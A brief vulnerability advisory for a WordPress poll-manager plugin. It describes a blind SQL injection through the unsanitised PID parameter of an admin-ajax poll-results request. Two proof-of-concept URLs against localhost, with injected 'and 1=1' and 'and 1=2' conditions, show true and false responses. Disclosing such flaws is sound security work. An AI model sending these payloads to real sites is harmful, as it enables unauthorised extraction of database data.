Info:

Best Plugin to create Polls for your site. Everything is smoother, faster,
and seamless like WordPress itself.

    Poll Manager,
        Ability to set general and post/page specific polls,
        Ability to leaf over the polls
        Ability to add certain poll in certain post content
        Ability to show polls either with and without current results of
polls


Details:

the Variable PID is not properly sanitized in the get request before
insertion into the database query; allowing an attaacker or any user who
can view poll results (supposedly   all user) to use blind sql injection to
extract database data and possibly compromise the whole server. a POC is
provided with both true and false results.

POC 1(TRUE):

http://127.0.0.1/wordpress/wp-admin/admin-ajax.php?action=upm_ayax_polls_result&do=result&post=1&type=general&PID=2and
1=1

"poll results for poll 2 is displayed"

POC 2 (FALSE):

http://127.0.0.1/wordpress/wp-admin/admin-ajax.php?action=upm_ayax_polls_result&do=result&post=1&type=general&PID=2and
1=2

"Blank page is displayed"
